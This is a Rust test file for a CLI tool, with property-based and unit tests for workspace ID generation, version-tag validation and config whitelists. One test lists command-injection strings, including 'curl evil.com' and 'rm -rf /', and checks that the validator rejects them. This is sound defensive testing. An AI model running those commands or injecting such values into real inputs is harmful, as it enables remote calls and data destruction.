//! Property-based tests for critical validation and generation logic.
//!
//! Uses `proptest` to verify invariants across many random inputs.

#![allow(clippy::expect_used)]

use proptest::prelude::*;

use polis_cli::commands::config::{validate_config_key, validate_config_value};
use polis_cli::commands::start::generate_workspace_id;
use polis_cli::commands::update::validate_version_tag;

// ============================================================================
// generate_workspace_id() property tests
// ============================================================================

proptest! {
    /// Generated IDs always have correct format: polis- prefix + 16 hex chars.
    #[test]
    fn prop_workspace_id_has_valid_format(_seed in 0u64..1000) {
        let id = generate_workspace_id();
        prop_assert!(id.starts_with("polis-"), "missing polis- prefix: {}", id);
        prop_assert!(id.len() == 22, "wrong length: {}", id);
        prop_assert!(id[6..].chars().all(|c| c.is_ascii_hexdigit()), "non-hex chars: {}", id);
    }
}

#[test]
fn test_workspace_id_uniqueness_batch() {
    // Generate 100 IDs and verify all are unique
    let ids: std::collections::HashSet<_> = (0..100).map(|_| generate_workspace_id()).collect();
    assert_eq!(ids.len(), 100, "duplicate IDs generated");
}

// ============================================================================
// validate_version_tag() property tests
// ============================================================================

proptest! {
    /// Valid semver tags with v prefix are accepted.
    #[test]
    fn prop_valid_semver_tags_accepted(
        major in 0u32..100,
        minor in 0u32..100,
        patch in 0u32..100,
    ) {
        let tag = format!("v{major}.{minor}.{patch}");
        prop_assert!(validate_version_tag(&tag).is_ok(), "rejected valid tag: {tag}");
    }

    /// Pre-release tags with alphanumeric identifiers are accepted.
    #[test]
    fn prop_prerelease_tags_accepted(
        major in 0u32..10,
        minor in 0u32..10,
        patch in 0u32..10,
        pre in "[a-zA-Z][a-zA-Z0-9]{0,5}",
        num in 0u32..100,
    ) {
        let tag = format!("v{major}.{minor}.{patch}-{pre}.{num}");
        prop_assert!(validate_version_tag(&tag).is_ok(), "rejected valid prerelease: {tag}");
    }

    /// Tags without v prefix are rejected.
    #[test]
    fn prop_missing_v_prefix_rejected(
        major in 0u32..100,
        minor in 0u32..100,
        patch in 0u32..100,
    ) {
        let tag = format!("{major}.{minor}.{patch}");
        prop_assert!(validate_version_tag(&tag).is_err(), "accepted tag without v: {tag}");
    }

    /// Arbitrary strings (not semver) are rejected.
    #[test]
    fn prop_arbitrary_strings_rejected(s in "[^v].*") {
        // Skip empty strings
        if !s.is_empty() {
            prop_assert!(validate_version_tag(&s).is_err(), "accepted invalid: {s}");
        }
    }
}

#[test]
fn test_version_tag_rejects_injection_attempts() {
    let malicious = [
        "v1.0.0; curl evil.com",
        "v1.0.0 && rm -rf /",
        "v1.0.0$(whoami)",
        "v1.0.0`id`",
        "latest",
        "v1",
        "v1.0",
        "",
    ];
    for tag in malicious {
        assert!(
            validate_version_tag(tag).is_err(),
            "accepted malicious tag: {tag}"
        );
    }
}

#[test]
fn test_version_tag_accepts_known_good() {
    let valid = [
        "v0.3.0",
        "v1.0.0",
        "v1.0.0-rc.1",
        "v2.0.0-beta.3",
        "v10.20.30",
    ];
    for tag in valid {
        assert!(
            validate_version_tag(tag).is_ok(),
            "rejected valid tag: {tag}"
        );
    }
}

// ============================================================================
// validate_config_key/value() property tests
// ============================================================================

proptest! {
    /// Arbitrary keys (not in whitelist) are rejected.
    #[test]
    fn prop_arbitrary_keys_rejected(key in "[a-z]{1,20}\\.[a-z]{1,20}") {
        // Skip the one valid key
        if key != "security.level" {
            prop_assert!(validate_config_key(&key).is_err(), "accepted invalid key: {key}");
        }
    }

    /// Arbitrary values for security.level (not in whitelist) are rejected.
    #[test]
    fn prop_arbitrary_security_values_rejected(value in "[a-z]{1,20}") {
        if value != "balanced" && value != "strict" {
            prop_assert!(
                validate_config_value("security.level", &value).is_err(),
                "accepted invalid value: {value}"
            );
        }
    }
}

#[test]
fn test_config_key_whitelist() {
    assert!(validate_config_key("security.level").is_ok());
    assert!(validate_config_key("unknown.key").is_err());
    assert!(validate_config_key("").is_err());
    assert!(validate_config_key("defaults.agent").is_err());
}

#[test]
fn test_config_value_whitelist() {
    assert!(validate_config_value("security.level", "balanced").is_ok());
    assert!(validate_config_value("security.level", "strict").is_ok());
    assert!(validate_config_value("security.level", "relaxed").is_err());
    assert!(validate_config_value("security.level", "").is_err());
}
